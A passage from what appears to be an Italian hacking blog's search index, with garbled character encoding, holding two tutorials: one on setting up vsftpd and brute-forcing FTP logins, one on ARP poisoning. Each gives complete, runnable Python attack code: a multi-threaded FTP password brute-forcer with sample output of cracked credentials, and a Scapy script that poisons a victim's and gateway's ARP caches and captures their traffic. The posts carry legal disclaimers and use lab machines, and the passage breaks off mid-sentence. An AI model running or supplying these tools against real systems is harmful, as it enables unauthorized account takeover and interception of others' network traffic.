parte allâ€™altra. Il protocollo controlla eventuali errori.\nÃˆ necessario distinguere perÃ² tra FTP attivo e passivo. Nella variante attiva Ã¨ il client a stabilire la connessione, come spiegato, attraverso la porta 21 e a comunicare al server su quale porta lato cliente questo puÃ² inviare la propria risposta. Ma se il client Ã¨ protetto da un firewall, allora il server non potrÃ  inviare alcuna risposta in quanto tutte le connessioni esterne sono bloccate. Proprio per questi casi Ã¨ stata sviluppata una modalitÃ  passiva, che prevede che sia il server a rendere nota la porta tramite la quale il client puÃ² creare il canale dati. In questo modo, essendo il client a iniziare la connessione, il firewall non blocca il trasferimento dei dati. Il File Transfer Protocol dispone di vari comandi e codici di stato. Grazie a ben 32 comandi totali - non sempre necessariamente tutti implementati dal server - il client istruisce il server su qual Ã¨ lâ€™operazione desiderata:\n caricare o scaricare file organizzare cartelle cancellare file  Il server risponde ogni volta con un codice di stato che serve a informare se il comando puÃ² essere eseguito o meno con successo. Il File Transfer Protocol originale venne creato senza misure di sicurezza preventive. Allâ€™epoca Internet era ancora molto piccolo e la cybercriminalitÃ  non esisteva ancora. Ma col passare del tempo i rischi di sicurezza associati allâ€™utilizzo del FTP sono diventati numerosi, venendo le informazioni trasmesse senza essere state precedentemente criptate.\nPerciÃ² sono state sviluppate due varianti sicure, che da allora continuano a farsi concorrenza: FTPS e SFTP. La prima variante consiste nel FTP over SSL. La connessione viene stabilita utilizzando i Secure Socket Layers (SSL), ossia il Transport Layer Security (TLS), che serve a criptare lo scambio di dati.\nIl SSH File Transfer Protocol (SFTP), al contrario, utilizza il Secure Shell (SSH) per garantire una trasmissione sicura dei dati.\nAnche in questo caso la connessione Ã¨ criptata. Ma mentre il FTPS necessita di due connessioni, al SFTP ne basta una sola. In compenso perÃ² bisogna utilizzare un programma aggiuntivo. Vsftpd (acronimo di Very Secure FTP daemon) Ã¨ un server FTP per sistemi simili a Unix, incluso Linux. Ãˆ il server FTP predefinito nelle distribuzioni Linux Ubuntu, CentOS, Fedora, NimbleX, Slackware e RHEL. Ãˆ concesso in licenza con GNU General Public License, supporta IPv6, TLS e FTPS.\nOra che abbiamo compreso cos\u0026rsquo;Ã¨ il protocollo FTP e a cosa serve, andiamo a vedere come configurare un server FTP con Linux.\nConfigurazione di un Server FTP con Vsftpd Il pacchetto vsftpd Ã¨ disponibile nei repository standard. Esegui i seguenti comandi per installarlo:\n$ sudo apt update $ sudo apt install vsftpd Al termine dell\u0026rsquo;installazione, il servizio ftp verrÃ  avviato automaticamente. Stampa lo stato del servizio per confermare:\n$ sudo systemctl status vsftpd Ãˆ possibile configurare il server vsftpd modificando il file /etc/vsftpd.conf. Il file di configurazione contiene la documentazione dettagliata per la maggior parte delle impostazioni. Visita la pagina ufficiale vsftpd per vedere tutte le opzioni disponibili. Per iniziare, apri il file di configurazione vsftpd:\n$ sudo nano /etc/vsftpd.conf Per assicurarti che solo gli utenti locali possano connettersi al server FTP, cerca le direttive anonymous_enable e local_enable e assicurati che le tue impostazioni corrispondano alle seguenti righe:\nanonymous_enable=NO local_enable=YES Creeremo un nuovo utente per testare il server FTP. Crea un nuovo utente chiamato newftpuser:\nsudo adduser newftpuser Impostare la password utente quando richiesto. Aggiungere l\u0026rsquo;utente all\u0026rsquo;elenco degli utenti FTP consentiti:\necho \u0026#34;newftpuser\u0026#34; | sudo tee -a /etc/vsftpd.user_list Crea l\u0026rsquo;albero della directory FTP e imposta le autorizzazioni corrette:\n$ sudo mkdir -p /home/newftpuser/ftp/upload $ sudo chmod 550 /home/newftpuser/ftp $ sudo chmod 750 /home/newftpuser/ftp/upload $ sudo chown -R newftpuser: /home/newftpuser/ftp Per il nostro fine vanno bene queste configurazioni, ma il file /etc/vsftpd.conf ne ha moltre altre, quindi invito chi fosse interessato ad approfondire meglio l\u0026rsquo;argomento.\nBrute Forcing delle credenziali di un server FTP con Python Useremo il modulo ftplib integrato in Python. Tuttavia, useremo colorama per stampare a colori in Python:\npip3 install colorama Inizia a scrivere il codice:\nimport ftplib from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (Windows) # init() # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 Quindi il server locale si trova a 192.168.1.113, ho creato anche un nome utente \u0026ldquo;test\u0026rdquo;, e poi specifichiamo la porta dell\u0026rsquo;FTP, che Ã¨ la 21.\nOra scriviamo la funzione principale che accetta una password negli argomenti e restituisce se le credenziali sono corrette:\ndef is_correct(password): # initialize the FTP server object server = ftplib.FTP() print(f\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials return False else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials:\u0026#34;, password, Fore.RESET) return True Niente di speciale; inizializziamo l\u0026rsquo;oggetto server FTP usando ftplib.FTP() e poi ci connettiamo a quell\u0026rsquo;host e proviamo ad accedere, questo solleverÃ  un\u0026rsquo;eccezione ogni volta che le credenziali non sono corrette, quindi se viene sollevata, restituiremo solo False e True altrimenti.\nUseremo un elenco di password conosciute. Sentiti libero di usarne uno qualsiasi, oppure puoi generare il tuo elenco di parole personalizzato usando Crunch. Tuttavia, utilizzeremo l\u0026rsquo;elenco delle password di Nmap che contiene circa 5000 password. Se sei su Kali Linux, si trova in \u0026ldquo;/usr/share/wordlists/nmap.lst\u0026rdquo;. Altrimenti, prendilo qui.\nUna volta che lo hai, mettilo nella directory corrente e chiamalo wordlist.txt e usa il seguente codice:\n# read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) Ora tutto ciÃ² che dobbiamo fare Ã¨ eseguire la funzione di cui sopra su tutte queste password:\n# iterate over passwords one by one # if the password is found, break out of the loop for password in passwords: if is_correct(password): break Ora, questo codice va bene, ma Ã¨ molto lento. Utilizza un solo thread che tenta in sequenza una connessione FTP su ciascuna password.\nUsiamo i thread per accelerare questo processo; il seguente codice Ã¨ quello completo che utilizza il multi-threading:\nimport ftplib from threading import Thread import queue from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) # init() # initialize the queue q = queue.Queue() # number of threads to spawn n_threads = 30 # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def connect_ftp(): global q while True: # get the password from the queue password = q.get() # initialize the FTP server object server = ftplib.FTP() print(\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials pass else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials: \u0026#34;) print(f\u0026#34;\\tHost: {host}\u0026#34;) print(f\u0026#34;\\tUser: {user}\u0026#34;) print(f\u0026#34;\\tPassword: {password}{Fore.RESET}\u0026#34;) # we found the password, let\u0026#39;s clear the queue with q.mutex: q.queue.clear() q.all_tasks_done.notify_all() q.unfinished_tasks = 0 finally: # notify the queue that the task is completed for this password q.task_done() # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # put all passwords to the queue for password in passwords: q.put(password) # create `n_threads` that runs that function for t in range(n_threads): thread = Thread(target=connect_ftp) # will end when the main thread end thread.daemon = True thread.start() # wait for the queue to be empty q.join() Fantastico, Ã¨ abbastanza simile al precedente, ma qui stiamo usando una coda che all\u0026rsquo;inizio Ã¨ riempita con l\u0026rsquo;elenco delle password, e nella funzione principale che viene eseguita da quei thread daemon, otteniamo una password dal coda e prova ad accedere con esso. Se la password Ã¨ corretta, dobbiamo terminare la forzatura bruta, un modo sicuro per farlo Ã¨ cancellare la coda, ed Ã¨ quello che stiamo facendo.\nAbbiamo anche utilizzato i thread daemon, quindi questi thread termineranno al termine del thread principale.\nEcco il codice completo:\nimport ftplib from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) init() # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def is_correct(password): # initialize the FTP server object server = ftplib.FTP() print(f\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials return False else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials:\u0026#34;, password, Fore.RESET) return True # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # iterate over passwords one by one # if the password is found, break out of the loop for password in passwords: if is_correct(password): break Ecco invece lâ€™esempio piÃº complesso:\nimport ftplib from threading import Thread import queue from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) # init() # initialize the queue q = queue.Queue() # number of threads to spawn n_threads = 30 # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def connect_ftp(): global q while True: # get the password from the queue password = q.get() # initialize the FTP server object server = ftplib.FTP() print(\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials pass else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials: \u0026#34;) print(f\u0026#34;\\tHost: {host}\u0026#34;) print(f\u0026#34;\\tUser: {user}\u0026#34;) print(f\u0026#34;\\tPassword: {password}{Fore.RESET}\u0026#34;) # we found the password, let\u0026#39;s clear the queue with q.mutex: q.queue.clear() q.all_tasks_done.notify_all() q.unfinished_tasks = 0 finally: # notify the queue that the task is completed for this password q.task_done() # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # put all passwords to the queue for password in passwords: q.put(password) # create `n_threads` that runs that function for t in range(n_threads): thread = Thread(target=connect_ftp) # will end when the main thread end thread.daemon = True thread.start() # wait for the queue to be empty q.join() Prova sul Campo Ora che abbiamo tutto, mettiamo alla prova le nostre conoscenze.\n Disclaimer: âš ï¸ Quello che verrÃ  visto di seguito Ã¨ un esempio per il solo scopo educativo, violare sistemi informatici senza autorizzazione Ã¨ un reato, vi invito dunque a replicare quanto vedrete SOLO su sistemi di vostra proprietÃ . âš ï¸\n Andiamo a installare vsftpd e inseriamo un nuovo utente. L\u0026rsquo;utente appena creato avrÃ  come credenziali:\n test : test\n Una volta creato l'utente test con la password test possiamo inserire le relative informazioni nello script, useremo il secondo essendo che sfrutta i thread, una volta inserito nello script lo username dell\u0026rsquo;utente che ci interessa e l\u0026rsquo;indirizzo IP della macchina avviamo il codice python con:\npython3 brute-ftp.py Nel mio caso sto eseguendo lo script su un portatile con Pop os e la macchina \u0026ldquo;vittima\u0026rdquo; Ã¨ una mcchina Ubuntu virtualizzata su VirtualBox. Una volta che lo script ha finito e riesce a trovare la password per l\u0026rsquo;utente test, questo Ã¨ l\u0026rsquo;output:\n[+] Passwords to try: 7 [!] Trying 123 [!] Trying aheq [!] Trying weeqe [!] Trying 9wee [!] Trying wewe [!] Trying 9002 [!] Trying test [+] Found credentials: Host: 192.168.1.242 User: test Password: test ","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/","tags":["Protocollo FTP","Brute Force","Python","vsftpd"],"title":"Brute Force di un Server FTP"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Cos\u0026rsquo;Ã¨ il Protocollo ARP Che cosâ€™Ã¨ lâ€™ARP Poisoning ARP Poisoning con Scapy e Python Come prevenire L\u0026rsquo;ARP Poisoning con DAI   In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l\u0026rsquo;ARP Poisoning.\nHo iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.\nCos\u0026rsquo;Ã¨ il Protocollo ARP Per approfondire l\u0026rsquo;argomento ti consigli di leggere questo.\nA differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per lâ€™indirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dellâ€™hardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si puÃ² applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dellâ€™indirizzo tramite ARP Ã¨ perciÃ² indispensabile.\nSe ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare lâ€™indirizzo MAC appropriato. CosÃ¬ entra in azione lâ€™Address Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando lâ€™indirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese â€œARP requestâ€) a tutti i dispositivi in rete, questa richiesta comprende allâ€™incirca le seguenti informazioni:\n Un computer con l\u0026rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l\u0026rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell\u0026rsquo;indirizzo MAC giusto.\n La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete Ã¨ collegato a una tabella locale, detta cache ARP, per evitare che prima dellâ€™invio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dellâ€™IP assegnato.\nTutti i computer nella rete annotano cosÃ¬ nella richiesta broadcast la coppia di indirizzo del mittente consegnato. PerÃ² ci si aspetta una risposta broadcast solo dal computer B, che invia unâ€™ARP reply comprendente le seguenti informazioni:\n Qui il sistema con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz. L\u0026rsquo;indirizzo MAC ricercato Ã¨ aa-aa-aa-aa-aa-aa.\n Se unâ€™ARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. PerciÃ² la comunicazione attraverso la rete locale non incontra nessun ostacolo.\nMa cosa succede se non Ã¨ il computer di destinazione ricercato a rispondere, bensÃ¬ un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco lâ€™ARP poisoning.\nOra che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante puÃ² usare le falle del protocollo per i suoi scopi.\nChe cosâ€™Ã¨ lâ€™ARP Poisoning Lo schema request-response del protocollo ARP Ã¨ creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dellâ€™ARP spoofing, gli hacker cercano perciÃ² di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare cosÃ¬ la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perchÃ© si intende un â€œavvelenamentoâ€ della cache ARP. Di solito il pacchetto comprende anche lâ€™indirizzo MAC di un dispositivo di rete, controllato dallâ€™hacker. Il sistema della vittima collega cosÃ¬ lâ€™IP di uscita con un indirizzo dellâ€™hardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dallâ€™hacker, che ha cosÃ¬ la possibilitÃ  di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene cosÃ¬ con lâ€™inganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bensÃ¬ rifiutati, lâ€™ARP poisoning puÃ² comportare un Denial of Service (DoS). Unâ€™altra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; perÃ² questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha lâ€™intenzione di accettare una risposta. Ãˆ quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.\nARP Poisoning con Scapy e Python Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.\n Disclaimer: âš ï¸ Quello che starete per vedere Ã¨ un esempio di attacco informatico che sto svolgendo su sistemi di mia proprietÃ . Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione Ã¨ un illecito. âš ï¸\n Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.\nPer prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:\nifconfig [interface] interface dovrÃ  essere sostituito con il nome dellâ€™interfaccia di rete della macchina vittima, nel mio caso lâ€™interfaccia Ã¨ wlp61s0, lâ€™output dovrÃ  essere un qualcosa simile a:\nwlp61s0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.1.22 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fe80::bf57:5b8e:8ef6:fe0b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether b4:6b:fc:a3:63:99 txqueuelen 1000 (Ethernet) RX packets 190150 bytes 230866258 (230.8 MB) RX errors 0 dropped 2237 overruns 0 frame 0 TX packets 52365 bytes 14313727 (14.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Il comando ifconfig ci mostra la configurazione della rete per unâ€™interfaccia specifica (in questâ€™esempio Ã¨ la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.\nLâ€™output mostra che lâ€™indirizzo inet (IPv4) per il dispositivo Ã¨ 192.168.1.22. Ãˆ mostrato anche lâ€™indirizzo mac ether che Ã¨ b4:6b:fc:a3:63:99.\nOra vediamo la cache ARP della macchina vittima, usiamo il comando:\narp -a Il risultato Ã¨ qualcosa del tipo:\nwind3.hub (192.168.1.1) associato a b8:d5:26:69:b5:dc [ether] su wlp61s0 Kobra3390.wind3.hub (192.168.1.233) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 192.168.1.233 Ã¨ lâ€™indirizzo IP della macchina Kali, mentre 192.168.1.1 Ã¨ lâ€™indirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dellâ€™indirizzo MAC registrato per il gateway.\nConoscendo lâ€™indirizzo IP dellâ€™attaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): pass class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): pass def run(self): pass def poison(self): pass def sniff(self, count=200): pass def restore(self): pass if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Come si vede, definiamo una funzione helper per ottenere lâ€™ indirizzo MAC per una determinata macchina e una classe Arper per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione get_mac che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:\ndef get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None Le passiamo lâ€™indirizzo IP dellâ€™obiettivo e creiamo un pacchetto. La funzione Ether specifica che il pacchetto Ã¨ concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere lâ€™indirizzo MAC collegato chiedendo a ogni nodo della rete se Ã¨ in possesso di quellâ€™indirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy srp che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile resp che dovrebbe contenere la sorgente Ether (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe Arper:\nclass Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo lâ€™interfaccia che vogliamo utilizzare (eth0 Ã¨ lâ€™opzione di default). Popoliamo le variabili interne dellâ€™oggetto con interface, victim, victimmac, gateway e gatewaymac stampandone i valori a console.\nAllâ€™interno della classe Arper scriviamo la funzione run che rappresenta lâ€™entry point del nostro attacco:\ndef run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) Il metodo run esegue tutto il lavoro principale dellâ€™oggetto Arper. Imposta ed esegue due processi:\n Il primo avvelena la cache ARP Il secondo ci permette di osservare lâ€™evoluzione dellâ€™attacco sniffando il traffico di rete  Il metodo poison produce i pacchetti â€œavvelenatiâ€ e li invia alla vittima e al gateway:\ndef poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) Il metodo poison imposta i dati che useremo per â€œavvelenareâ€ la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP poisoned per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli lâ€™indirizzo IP della vittima ma con il MAC dellâ€™aggressore. Facciamo poi lo stesso inviando alla vittima lâ€™indirizzo IP del gateway ma con il MAC address dellâ€™aggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.\nPoi iniziamo a spedire i pacchetti â€œavvelenatiâ€ alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dellâ€™attacco.\nPorremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da lÃ¬ ripristineremo la situazione riportandola alla normalitÃ , inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.\nPer vedere e registrare cosa succede durante le nostre operazioni di poisoning, intercettiamo il traffico di rete con il metodo sniff:\ndef sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) Il metodo sniff resta in pausa per cinque secondi prima di iniziare lo sniffing per dare tempo al thread che esegue il vero e proprio poisoning di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono lâ€™indirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo arper.pcap, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo lâ€™attacco.\nDa ultimo, il metodo restore riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:\ndef restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) Il metodo restore potrebbe essere chiamato sia da poison (dopo un CTRL-C), sia da sniff (quando il numero di pacchetti richiesti Ã¨ stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.\nEcco il codice completo:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) def run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) self.sniff_thread.start() def poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) def sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) def restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Prima di avviare lâ€™attacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:\nsudo echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward Ora che lâ€™IP forwarding Ã¨ stato 